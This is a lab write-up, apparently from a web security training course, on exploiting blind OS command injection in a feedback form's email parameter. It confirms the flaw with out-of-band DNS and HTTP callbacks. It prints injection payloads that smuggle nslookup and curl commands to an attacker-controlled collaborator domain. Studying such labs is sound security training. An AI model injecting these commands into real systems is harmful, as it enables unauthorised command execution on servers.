# Blind OS command injection with out-of-band interaction

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663RVIR5ZO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215558Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC2mgYRKimp1d1BmS0dxnRY%2BDttSNqw7EV4N3XwtW8OUgIhAOaRJipKsrV2nJiHgOkLwD2OQju0P7fcrIj6CrvIfBNjKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igz5n7ELjRQtNGvDg1wq3AMRQxq%2FHCM5bA3I2VVAUspp6uzCpNVzQX0xjre6jb6JIMioX%2B5LhYk4Sd30G6fc5Uq8wS5pt5QQKvl2vGnDNficdEN9w3pQrrixfuxh5UsO%2FSxvylXJHbYmrA1VWm4hl2cE62ebank3rUPX%2Bemx86Y%2BRLEob38AyBtsF%2FPXQzaIdfcXJ5GE8ujeHHcCPG%2FTaRjwsSSZnAFn01Wz3LdLwIhXpjSM7d6jVCyN9EAnMADWnWlWOmBHjIaJNhHrTkCDcAMVBdqLn4xcSPU1ENUZB2Sbfwe%2Fs5Z5qWJEDwu539Nnk3ACpZhKC683rjw4yAbRcGdZCxFnpy0rVrgLJswFqB1J%2BoIyCQ0bZynYBXOUgHnW7b1XEBLht5aqXaIGmueZnSJnkg%2FKp%2BCfyvdw0zk7%2BIusvAByyFbQ%2BzW3WGONuhX6hUliKgDjSzC0owtnK3buNIi%2FdOOc4R9Fiv5xWczA9dofLFu5MBxtvQfhWCCb%2FEZko4ImAvSwSoKIFxD1%2BvLvVUmhTPMTBV43hTuk9%2FVCf8UahUC%2Fn7ho%2F0bfgVAamZrmGFCTXQNDTDQDxyt6dMeBYGcB9l1ZsYfjHEJvWqLru4TwXyiA7DUe5BUmeWSAuY2ldukgnbGEKD7wd4GgTDDhg6PUBjqkAV8IUUCpB9nyrJEHRf9SPQkVDfUEQpcyJliWDY8F6aRIO%2Bea50ElzDjIjNghM3hHNeQwpA0V%2Fvs6LyL9lfhi%2FFUDfdCS9D3qnqRQkSSOmp%2FPo75tQO6d0MDEehrUN6HvvLX1VFdvgpJLC08wGBwfJA5O9QLw1K1z8qKzM49ycjOIN1fke5qRSeWfn4zmCBVezV1V%2Bno1zRGGQt3dxbAxq7vl%2Fp2A&X-Amz-Signature=1140bfc070fe55a0c2d5bcfed604315d0195598933f66171398b8d5b25a51498&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

> 💡 We can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

```bash
& nslookup kgji2ohoyw.web-attacker.com &

```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/60ea66f9-854a-4130-b9fd-6b6833371b79/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663RVIR5ZO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215558Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC2mgYRKimp1d1BmS0dxnRY%2BDttSNqw7EV4N3XwtW8OUgIhAOaRJipKsrV2nJiHgOkLwD2OQju0P7fcrIj6CrvIfBNjKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igz5n7ELjRQtNGvDg1wq3AMRQxq%2FHCM5bA3I2VVAUspp6uzCpNVzQX0xjre6jb6JIMioX%2B5LhYk4Sd30G6fc5Uq8wS5pt5QQKvl2vGnDNficdEN9w3pQrrixfuxh5UsO%2FSxvylXJHbYmrA1VWm4hl2cE62ebank3rUPX%2Bemx86Y%2BRLEob38AyBtsF%2FPXQzaIdfcXJ5GE8ujeHHcCPG%2FTaRjwsSSZnAFn01Wz3LdLwIhXpjSM7d6jVCyN9EAnMADWnWlWOmBHjIaJNhHrTkCDcAMVBdqLn4xcSPU1ENUZB2Sbfwe%2Fs5Z5qWJEDwu539Nnk3ACpZhKC683rjw4yAbRcGdZCxFnpy0rVrgLJswFqB1J%2BoIyCQ0bZynYBXOUgHnW7b1XEBLht5aqXaIGmueZnSJnkg%2FKp%2BCfyvdw0zk7%2BIusvAByyFbQ%2BzW3WGONuhX6hUliKgDjSzC0owtnK3buNIi%2FdOOc4R9Fiv5xWczA9dofLFu5MBxtvQfhWCCb%2FEZko4ImAvSwSoKIFxD1%2BvLvVUmhTPMTBV43hTuk9%2FVCf8UahUC%2Fn7ho%2F0bfgVAamZrmGFCTXQNDTDQDxyt6dMeBYGcB9l1ZsYfjHEJvWqLru4TwXyiA7DUe5BUmeWSAuY2ldukgnbGEKD7wd4GgTDDhg6PUBjqkAV8IUUCpB9nyrJEHRf9SPQkVDfUEQpcyJliWDY8F6aRIO%2Bea50ElzDjIjNghM3hHNeQwpA0V%2Fvs6LyL9lfhi%2FFUDfdCS9D3qnqRQkSSOmp%2FPo75tQO6d0MDEehrUN6HvvLX1VFdvgpJLC08wGBwfJA5O9QLw1K1z8qKzM49ycjOIN1fke5qRSeWfn4zmCBVezV1V%2Bno1zRGGQt3dxbAxq7vl%2Fp2A&X-Amz-Signature=1889c917bfc23c7b6f06352c076979bb47871c6c5a971892a4104ee4b09de7cf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

**Besides from **`nslookup`**, we can also use **`curl`**:**

`;curl bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;# `

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/b558b3bb-6a70-4cd6-8fe6-c1745e856deb/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663RVIR5ZO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215558Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC2mgYRKimp1d1BmS0dxnRY%2BDttSNqw7EV4N3XwtW8OUgIhAOaRJipKsrV2nJiHgOkLwD2OQju0P7fcrIj6CrvIfBNjKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igz5n7ELjRQtNGvDg1wq3AMRQxq%2FHCM5bA3I2VVAUspp6uzCpNVzQX0xjre6jb6JIMioX%2B5LhYk4Sd30G6fc5Uq8wS5pt5QQKvl2vGnDNficdEN9w3pQrrixfuxh5UsO%2FSxvylXJHbYmrA1VWm4hl2cE62ebank3rUPX%2Bemx86Y%2BRLEob38AyBtsF%2FPXQzaIdfcXJ5GE8ujeHHcCPG%2FTaRjwsSSZnAFn01Wz3LdLwIhXpjSM7d6jVCyN9EAnMADWnWlWOmBHjIaJNhHrTkCDcAMVBdqLn4xcSPU1ENUZB2Sbfwe%2Fs5Z5qWJEDwu539Nnk3ACpZhKC683rjw4yAbRcGdZCxFnpy0rVrgLJswFqB1J%2BoIyCQ0bZynYBXOUgHnW7b1XEBLht5aqXaIGmueZnSJnkg%2FKp%2BCfyvdw0zk7%2BIusvAByyFbQ%2BzW3WGONuhX6hUliKgDjSzC0owtnK3buNIi%2FdOOc4R9Fiv5xWczA9dofLFu5MBxtvQfhWCCb%2FEZko4ImAvSwSoKIFxD1%2BvLvVUmhTPMTBV43hTuk9%2FVCf8UahUC%2Fn7ho%2F0bfgVAamZrmGFCTXQNDTDQDxyt6dMeBYGcB9l1ZsYfjHEJvWqLru4TwXyiA7DUe5BUmeWSAuY2ldukgnbGEKD7wd4GgTDDhg6PUBjqkAV8IUUCpB9nyrJEHRf9SPQkVDfUEQpcyJliWDY8F6aRIO%2Bea50ElzDjIjNghM3hHNeQwpA0V%2Fvs6LyL9lfhi%2FFUDfdCS9D3qnqRQkSSOmp%2FPo75tQO6d0MDEehrUN6HvvLX1VFdvgpJLC08wGBwfJA5O9QLw1K1z8qKzM49ycjOIN1fke5qRSeWfn4zmCBVezV1V%2Bno1zRGGQt3dxbAxq7vl%2Fp2A&X-Amz-Signature=f5c40beff5c45b6792a66ce9e71a3d300e7f9c93be6ed8d50270a412cdec3a23&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
